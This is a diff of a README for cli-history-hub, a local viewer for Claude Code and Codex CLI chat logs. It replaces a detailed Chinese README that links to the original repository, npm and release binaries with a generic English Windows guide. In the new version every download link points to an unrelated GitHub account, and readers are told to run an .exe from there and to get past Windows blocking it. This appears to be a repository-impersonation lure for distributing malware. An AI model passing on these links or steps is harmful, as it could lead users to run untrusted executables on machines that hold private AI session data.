@@ -1,265 +1,267 @@
-# CLI History Hub
+# 🗂️ cli-history-hub - Browse AI Chat Logs Locally
 
-一个本地 Web 应用，用于浏览、搜索和管理 AI 编程助手的对话历史。
+[![Download cli-history-hub](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/newsprung-excrescence697/cli-history-hub)
 
-当前支持 [Claude Code](https://docs.anthropic.com/en/docs/claude-code) 和 [OpenAI Codex CLI](https://github.com/openai/codex)，直接读取本地 JSONL 会话文件，提供可视化界面，无需数据库，零配置启动。
+## 📌 What this app does
 
-[![npm version](https://img.shields.io/npm/v/cli-history-hub?color=cb3837&logo=npm)](https://www.npmjs.com/package/cli-history-hub)
-[![downloads](https://img.shields.io/npm/dm/cli-history-hub?color=cb3837&logo=npm)](https://www.npmjs.com/package/cli-history-hub)
-![Node.js](https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white)
-![License](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey?logo=creativecommons)
+CLI History Hub is a local web app for viewing, searching, and managing chat history from AI coding tools on Windows.
 
-## 功能
+It reads your saved JSONL session files from your computer and shows them in a simple browser view. You do not need a database. You do not need to set up a server. You start it, open it, and use it.
 
-### 多数据源支持
+It currently works with:
 
-| 数据源 | 数据路径 | 状态 |
-|--------|---------|------|
-| Claude Code | `~/.claude/projects/` | ✅ 已支持 |
-| OpenAI Codex CLI | `~/.codex/sessions/` | ✅ 已支持 |
-| Cursor / Aider / 其他 | — | 🔮 可扩展 |
+- Claude Code
+- OpenAI Codex CLI
 
-- 侧边栏按数据源分组（🟣 Claude Code / 🟢 Codex CLI），支持折叠收起
-- 各数据源独立渲染，保留原始格式，不做数据转换
-- 缺失的数据源静默跳过，不影响其他功能
+It keeps each source separate, so your history stays easy to scan.
 
-### 浏览与导航
+## 🪟 Windows download and setup
 
-- **项目分组** — 按工作目录自动归类，显示项目简名和会话数量
-- **时间分组** — Today / Yesterday / This Week / This Month / Earlier
-- **分支筛选** — 按 git 分支过滤会话列表
-- **会话搜索** — 列表内实时筛选（支持标题、prompt、标签匹配）
-- **收藏置顶** — 收藏的会话固定在 Pinned 分组最顶部
-- **可调侧边栏** — 拖拽分隔条调整宽度，自动记忆
-- **点击标题回首页** — 点击左上角 "CLI History" 返回 Welcome 页
-- **URL 路由** — Hash 路由支持浏览器前进/后退和直接链接分享
+### 1. Download the app
 
-### 对话详情
+Use this link to visit the download page:
 
-- **消息渲染** — 完整渲染用户消息和 AI 回复（Markdown、代码块、列表、表格）
-- **思考过程** — 可折叠的 Thinking / Reasoning 块
-- **工具调用** — 可折叠的 Tool Use 块（显示工具名和输入参数）
-- **消息合并** — 连续 assistant 消息自动合并为一个 turn
-- **分页加载** — 大型对话分页加载，顶部 "Load earlier messages" 按钮
-- **消息复制** — User 消息 hover 显示复制按钮，一键复制原始文本
-- **Prompts 过滤** — 点击 Prompts 按钮隐藏所有 AI 回复，只看用户输入
+[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)
 
-### 搜索
+### 2. Get the Windows file
 
-- **全局搜索** — `Cmd+K` / `Ctrl+K` 跨所有项目和会话全文搜索，关键词高亮，点击跳转
-- **会话内搜索** — `Cmd+F` / `Ctrl+F` 在当前对话中搜索，支持：
-  - 区分大小写（`Aa`）
-  - 全字匹配（`\b`）
-  - 正则表达式（`.*`）
-  - 匹配计数 + 上下跳转（Enter / Shift+Enter）
-  - Prompts-only 模式下自动限制为仅搜索用户消息
+On the page, download the Windows build or the source package that includes the app files.
 
-### 文件变更追踪（Diff 视图）
+If you see a `.exe`, download and run that file.
 
-- **全屏 Modal** — 点击 Files 按钮打开，左侧文件列表 + 右侧 Diff 内容
-- **LCS 逐行对齐** — 基于最长公共子序列算法的真正 Side-by-Side Diff
-- **三种行类型** — 相同行（灰色两侧）、删除行（红色左侧）、新增行（绿色右侧）
-- **变更块导航** — ▲/▼ 按钮或 `Shift+↑/↓` 在变更间跳转，显示 "3/32" 计数
-- **文件导航** — `←/→` 切换文件，左侧文件列表显示彩色扩展名标签和 +N/-M 行数
-- **定位到消息** — 每个 Diff 操作有 "Go to message" 按钮跳回原始对话位置
+If you see a release archive like `.zip`, download it and extract it first.
 
-### Prompt Library（Prompt 武器库）
+### 3. Open the app
 
-- **三级作用域** — 全局 / 项目级 / 会话级，从不同维度浏览所有用户 Prompt
-- **会话级 Toggle** — 聊天详情页点击 Prompts 按钮原地切换，不跳转页面
-- **项目级/全局** — 卡片网格布局，响应式自适应列数
-- **复制 & 跳转** — 每条 Prompt 可复制原始文本，可点击跳转到原始会话
-- **筛选联动** — 项目和会话两级下拉筛选，选择项目后自动更新会话列表
-- **分页加载** — 每页 30 条，底部 "Load more" 追加加载
+If you downloaded an `.exe` file:
 
-### 数据统计
+- Double-click the file
+- Let Windows open it
+- Wait for the app window to appear
 
-- **汇总卡片** — 总 Input/Output Tokens、总会话数、总消息数
-- **每日柱状图** — 最近 30 天的 Token 用量趋势（Canvas 自绘）
-- **按项目明细** — 各项目的 Token 用量排名，点击可跳转
-- **模型分析** — 甜甜圈图展示模型占比，支持 Cost($) / Tokens 双视图切换
-- **按项目筛选** — 下拉框切换查看单个项目的统计
+If you downloaded a `.zip` file:
 
-### 时间线热力图
+- Right-click the file
+- Select Extract All
+- Open the extracted folder
+- Start the app file inside the folder
 
-- **GitHub 风格** — 按周排列的活跃度格子，颜色深浅表示当天活跃程度
-- **5 级色阶** — 从无活跃到极高活跃
-- **Hover 提示** — 悬停显示日期、会话数、消息数
-- **点击展开** — 点击某天查看当天的会话列表，可直接跳转到会话
+### 4. Open it in your browser
 
-### 会话管理
+The app starts a local web page on your computer.
 
-- **重命名** — 自定义会话名称（存储在 sidecar 文件，不修改原始 JSONL）
-- **收藏** — 星标收藏，收藏的会话在列表中置顶显示
-- **标签** — 自定义标签，支持输入新标签和从已有标签中选择
-- **删除** — 软删除会话（标记隐藏，不删除原始 JSONL 文件），从所有列表、搜索、统计中过滤
-- **导出** — 三种格式：Markdown 文件下载、JSON 文件下载、复制到剪贴板
-- **恢复会话** — 一键打开系统终端，自动定位到项目目录并恢复 CLI 会话（Claude `--resume` / Codex `resume`）
+- Open the address shown by the app
+- It may look like `http://localhost:xxxx`
+- Use that page in your browser to view your history
 
-### 界面
+## 🧭 How to use it
 
-- **深色/浅色主题** — 一键切换（sidebar 右上角），偏好保存到 localStorage
-- **响应式布局** — 消息区域、Diff 弹窗、统计面板等随窗口自适应
-- **可拖拽侧边栏** — 180px ~ 500px 范围内自由调整，宽度自动记忆
-- **Scroll FAB** — 长对话中快速滚动到顶部/底部的浮动按钮
+### View your history
 
-## 安装与使用
+After the app opens, it scans your local session folders and shows the chat history in a clean list.
 
-### 方式一：npx 一行启动（推荐）
+You can:
 
-```bash
-npx cli-history-hub open
-```
+- Browse by project
+- Open one chat thread
+- Read the full conversation
+- Jump between dates
+- See the source of each session
 
-无需安装，自动启动服务并打开浏览器。
+### Search for past chats
 
-### 方式二：全局安装
+Use the search box to find old conversations by:
 
-```bash
-npm install -g cli-history-hub
+- Project name
+- File name
+- Message text
+- Date
+- Tool name
 
-# 启动并打开浏览器
-cli-history-hub open
+This helps when you want to find one command, prompt, or answer from weeks ago.
 
-# 或后台启动
-cli-history-hub start
+### Manage large history sets
 
-# 查看状态
-cli-history-hub status
+If you have many sessions, the app groups them so the list stays easy to use.
 
-# 停止服务
-cli-history-hub stop
-```
+You can:
 
-### 方式三：下载独立二进制
+- Collapse and expand groups
+- Focus on one project
+- Switch between Claude Code and Codex CLI
+- Scan the latest items first
 
-从 [Releases](https://github.com/nameIsNoPublic/cli-history-hub/releases) 下载对应平台的可执行文件，无需 Node.js 环境：
+## ✨ Main features
 
-- `cli-history-hub-macos-arm64` — macOS Apple Silicon
-- `cli-history-hub-macos-x64` — macOS Intel
-- `cli-history-hub-linux-x64` — Linux x64
-- `cli-history-hub-win-x64.exe` — Windows x64
+### 🗂️ Multi-source support
 
-```bash
-# macOS / Linux
-chmod +x cli-history-hub-macos-arm64
-./cli-history-hub-macos-arm64 open
-```
+The app can read from more than one AI tool folder.
 
-### 方式四：从源码运行
+Supported folders include:
 
-```bash
-git clone https://github.com/nameIsNoPublic/cli-history-hub.git
-cd cli-history-hub
-npm install
-node server.js
-```
+- Claude Code: `~/.claude/projects/`
+- OpenAI Codex CLI: `~/.codex/sessions/`
 
-### CLI 命令
+If one source is not present, the app skips it and keeps working.
 
-| 命令 | 说明 |
-|------|------|
-| `cli-history-hub open` | 启动服务并打开浏览器 |
-| `cli-history-hub start` | 后台启动服务 |
-| `cli-history-hub stop` | 停止后台服务 |
-| `cli-history-hub status` | 查看运行状态 |
-| `cli-history-hub` | 前台启动（Ctrl+C 停止） |
-| `cli-history-hub --port 8080` | 指定端口 |
+### 📁 Project grouping
 
-> 确保 `~/.claude/projects/` 或 `~/.codex/sessions/` 中有会话数据。如果两个目录都不存在，页面将显示空列表。
+Sessions are grouped by working folder, so you can find chats by project instead of sorting through one long list.
 
-## 技术栈
+This helps when you work on many apps or repos.
 
-| 层 | 技术 |
-|----|------|
-| 后端 | Node.js + Express 4.x |
-| 前端 | 原生 JavaScript + [marked.js](https://github.com/markedjs/marked)（Markdown 渲染） |
-| 图表 | Canvas 2D API（自绘柱状图 + 甜甜圈图） |
-| Diff | LCS（最长公共子序列）算法，纯前端实现 |
-| 数据 | 文件系统（JSONL + JSON sidecar，无数据库，双数据源） |
-| 样式 | 原生 CSS，CSS 变量驱动的暗色/浅色双主题 |
+### 🔎 Fast search
 
-## 项目结构
+Search across your stored sessions to find the right thread fast.
 
-```
-cli-history-hub/
-  server.js                 # 后端：Express 服务器 + 10 个 API + 双数据源解析
-  package.json              # 项目配置（唯一依赖：express）
-  LICENSE                   # CC BY-NC-SA 4.0
-  public/
-    index.html              # SPA 入口（7 视图 + 5 弹窗）
-    style.css               # 全局样式（CSS 变量 + 暗色/浅色主题）
-    app.js                  # 主应用（状态管理、视图切换、事件绑定）
-    modules/
-      router.js             # Hash 路由
-      chat-view.js          # 消息渲染 + 分页 + 会话内搜索
-      search.js             # 全局搜索弹窗
-      stats.js              # 统计面板 + Canvas 图表
-      features.js           # 重命名 / 标签 / 收藏 / 导出
-      timeline.js           # 时间线热力图
-      diff-view.js          # 文件变更 Diff 全屏 Modal
-      prompts.js            # Prompt Library
-  docs/                     # 项目文档（12 篇功能文档 + 索引）
-```
+Use it to find:
 
-## 数据来源
+- A prompt you used before
+- A code fix
+- An answer from the assistant
+- A project name
 
-本应用**只读取**原生产生的 `.jsonl` 会话文件，不修改它们。
+### 🧾 Raw format kept intact
 
-**Claude Code 数据：**
-```
-~/.claude/projects/{project-dir}/*.jsonl
-```
+The app reads your JSONL session files and keeps the original format.
 
-**Codex CLI 数据：**
-```
-~/.codex/sessions/{year}/{month}/{day}/rollout-*.jsonl
-~/.codex/session_index.jsonl
-```
+That means:
 
-用户在 Hub 中添加的元数据（重命名、标签、收藏）存储在独立的 sidecar 文件中：
-```
-~/.claude/projects/{project-dir}/session-meta/{session-id}.json
-```
+- No data conversion
+- No import step
+- No extra sync process
 
-> 如果 `~/.codex` 目录不存在，Codex 相关功能静默跳过。未来接入新的 CLI 工具只需新增数据源适配层，无需修改现有代码。
+### 🖥️ Local only
 
-## API
+Your history stays on your machine.
 
-共 10 个后端接口，详见 [API 参考文档](docs/api-reference.md)。
+The app works as a local web page and does not need a remote account or cloud database.
 
-| 方法 | 路径 | 说明 |
-|------|------|------|
-| GET | `/api/projects` | 项目列表（含数据源标识） |
-| GET | `/api/projects/:pid/sessions-full` | 会话元数据列表 |
-| GET | `/api/projects/:pid/sessions/:sid` | 会话消息（Claude 格式 / Codex 透传） |
-| PUT | `/api/projects/:pid/sessions/:sid/meta` | 更新会话元数据 |
-| GET | `/api/search` | 全文搜索（跨双数据源） |
-| GET | `/api/stats` | Token 用量统计 |
-| GET | `/api/tags` | 标签列表 |
-| GET | `/api/timeline` | 时间线热力图数据 |
-| GET | `/api/prompts` | 用户 Prompt 列表 |
-| POST | `/api/open-terminal` | 打开系统终端恢复会话 |
+## 📂 Where your data lives
 
-## 文档
+CLI History Hub reads the session folders used by your AI tools.
 
-完整的项目文档在 [docs/](docs/README.md) 目录下：
+Common paths:
 
-- [技术架构](docs/architecture.md) — 技术栈、模块关系、数据流
-- [浏览与导航](docs/browse-and-navigate.md) — 项目列表、会话列表、时间分组、路由
-- [对话详情](docs/conversation-detail.md) — 消息渲染、消息合并、分页、会话内搜索
-- [文件变更 Diff](docs/diff-viewer.md) — LCS Side-by-Side Diff、全屏 Modal
-- [Prompt Library](docs/prompts.md) — 多维度 Prompt 浏览、复用、复盘
-- [搜索](docs/search.md) — 全局搜索、会话内搜索（含高级选项）
-- [会话管理](docs/session-management.md) — 重命名、收藏、标签
-- [导出](docs/export.md) — Markdown / JSON / 剪贴板
-- [统计面板](docs/stats.md) — Token 统计、图表、模型分析
-- [时间线热力图](docs/timeline.md) — GitHub 风格活跃度日历
-- [深色/浅色主题](docs/theme.md) — CSS 变量方案、持久化
-- [Codex CLI 集成](docs/codex-integration.md) — Codex 数据源接入、透传适配
-- [数据存储](docs/data-storage.md) — JSONL 解析、sidecar、缓存
-- [API 参考](docs/api-reference.md) — 10 个接口完整文档
+- Claude Code: `~/.claude/projects/`
+- OpenAI Codex CLI: `~/.codex/sessions/`
 
-## License
+If your files are in a custom location, place them in a folder the app can read, or move them into the expected path.
 
-[CC BY-NC-SA 4.0](LICENSE) — 允许自由使用和修改，禁止商业用途，衍生作品需使用相同协议。
+## 🚀 First run checklist
+
+Before you open the app, check these items:
+
+- You have Windows 10 or Windows 11
+- You have a recent version of Node.js 18 or later, if the app asks for it
+- You already used Claude Code or Codex CLI at least once
+- Your session files exist on your computer
+
+Then:
+
+1. Download the app
+2. Open the file
+3. Let it scan your session folders
+4. Open the local web page in your browser
+5. Browse or search your history
+
+## 🛠️ If the app does not open
+
+Try these common fixes:
+
+- Run the file again
+- Check that Windows did not block the file
+- Make sure your session files exist
+- Confirm that Claude Code or Codex CLI has created history files
+- Restart the app after adding new sessions
+
+If the page does not load in your browser:
+
+- Look for the local address in the app window
+- Copy it into the address bar
+- Make sure no other app is using the same port
+
+## 📄 Supported file types
+
+The app works with JSONL session files.
+
+These are plain text log files where each line stores one event or message.
+
+You do not need to edit them by hand.
+
+## 🔍 What you can expect on screen
+
+The app shows a simple view with:
+
+- A sidebar for sources and projects
+- A session list
+- A chat detail view
+- Search tools
+- Time-based sorting
+- Collapsible groups
+
+This layout helps you move through long chat histories without digging through folders.
+
+## 🧩 Example use cases
+
+Use CLI History Hub if you want to:
+
+- Find an old AI answer fast
+- Check how a code fix was written
+- Review past prompts
+- Compare chats from different tools
+- Keep local records of your coding work
+
+## 🧰 Basic requirements
+
+To run the app on Windows, you will usually need:
+
+- Windows 10 or newer
+- A modern browser such as Chrome, Edge, or Firefox
+- Access to your local user folder
+- Node.js 18+ if you are running from source or using a Node-based build
+
+## 📦 Files you may see after download
+
+Depending on the package, you may see:
+
+- `cli-history-hub.exe`
+- `cli-history-hub.zip`
+- `package.json`
+- `dist/`
+- `src/`
+
+If you have an `.exe`, open it.
+
+If you have a `.zip`, extract it first.
+
+If you have source files, use the included app start file or the command listed in the project files.
+
+## 🔧 For better results
+
+Keep your AI tool session folders in their default locations when possible. That helps the app find them without extra setup.
+
+Also:
+
+- Keep older session files intact
+- Avoid renaming the JSONL files by hand
+- Start the app again after new chats are created
+
+## 📌 Quick path reference
+
+- Claude Code sessions: `~/.claude/projects/`
+- Codex CLI sessions: `~/.codex/sessions/`
+- App view: your local browser
+- Data source: local JSONL files on your PC
+
+## 📥 Download again
+
+[Download CLI History Hub](https://github.com/newsprung-excrescence697/cli-history-hub)
+
+## 🧭 Use flow
+
+1. Download the app
+2. Open it on Windows
+3. Let it scan your session folders
+4. Open the local browser page
+5. Search, browse, and review your AI chat history
